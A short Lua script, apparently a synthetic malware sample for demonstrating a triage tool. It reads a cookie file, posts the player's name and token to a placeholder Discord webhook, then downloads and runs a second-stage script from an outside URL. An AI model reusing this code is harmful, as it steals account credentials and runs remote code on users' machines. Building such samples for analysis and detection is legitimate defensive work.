-- This script is obfuscated with MoonVeil [https://getpolsec.com]
-- (SYNTHETIC triage sample: mimics a credential-stealer payload so the
--  behavior-summary / triage view can be demonstrated OFFLINE and SAFELY.
--  None of these calls do anything real inside the sandbox.)
return (function(...)
    local webhook = "https://discord.com/api/webhooks/000/AAAABBBBCCCC"
    local who = game:GetService("Players").LocalPlayer.Name
    local token = readfile("cookies.txt")
    request({ Url = webhook, Method = "POST", Body = tostring(who) .. ":" .. tostring(token) })
    writefile("exfil_done.txt", "ok")
    local more = game:HttpGet("https://getpolsec.com/stage2.lua")
    loadstring(more)()
    print("payload finished")
end)(...)
